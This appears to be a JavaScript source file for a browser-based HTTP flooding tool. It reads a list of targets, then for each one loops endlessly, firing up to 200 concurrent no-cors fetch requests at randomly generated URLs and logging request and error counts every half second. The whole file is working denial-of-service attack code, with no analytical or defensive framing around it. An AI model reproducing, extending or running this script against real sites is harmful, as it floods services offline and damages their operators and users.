import { createTargetUrl } from './utils/createTargetUrl';
import { printStats } from './utils/printStatistics';
import { targets } from './targets';

setInterval(() => {
    printStats(targets)
}, 500)

const CONCURRENCY_LIMIT = 200;
let queue = [];

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal,
    mode: 'no-cors',
    referrerPolicy: 'no-referrer',
  })
    .then(response => {
      clearTimeout(id);
      return response;
    })
    .catch(error => {
      clearTimeout(id);
      throw error;
    });
}

async function flood(target) {
  for (let i = 0; ; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }

    const target_url = createTargetUrl(targets[target].pattern);
    queue.push(
      fetchWithTimeout(target_url, { timeout: 1000 })
        .catch(error => {
          if (error.code === 20) return;

          targets[target].number_of_errored_responses++;
          targets[target].error_message = error.message;
        })
        .then(response => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
            targets[target].error_message = response.statusText;
          }

          targets[target].number_of_requests++;
        }),
    );
  }
}

// Start
Object.keys(targets).map(flood);
